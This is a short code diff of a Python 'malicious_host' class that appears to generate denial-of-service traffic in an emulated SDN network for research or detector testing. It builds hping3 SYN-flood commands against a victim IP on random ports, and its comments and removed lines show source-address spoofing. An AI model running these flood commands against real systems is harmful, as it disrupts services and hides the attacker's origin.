@@ -38,7 +38,7 @@ class malicious_host():
     while( count<80):
       for i in range(10):
         attack_port = randint(80, 65000)
-        attack = f'hping3 -c 2 -S -p {attack_port} -s 5002 {victim_ip}'
+        attack = f'hping3 -c 1 -S -p {attack_port} -s 5002 {victim_ip}'
         self.attacks.append(attack)
       for j in self.attacks:
         self.net.cmd(j)
@@ -48,7 +48,7 @@ class malicious_host():
     
     # different source ip
     # TODO thıs attack needs real Ip addresses from SDN
-    
+    #  -S -a birlikte calisiyor
   def attack_controller_ip(self, attack_duration, attack_number , victim_ip):
     #h1 hping3 -c 10 -S -p 9000 -a 192.168.1.100 10.0.0.2 can be used for IP attack
     start_time = time.time()
@@ -56,7 +56,7 @@ class malicious_host():
     while( count<80):
       for i in range(10):
         attack_port = randint(80, 65000)
-        attack = f'hping3 -d 100 -a 10.0.0.1 -s {attack_port} -p 80 -c 2 {victim_ip}'
+        attack = f'hping3 -d 100 -s {attack_port} -p 80 -c 1 {victim_ip}'
         self.attacks.append(attack)
       for j in self.attacks:
         self.net.cmd(j)
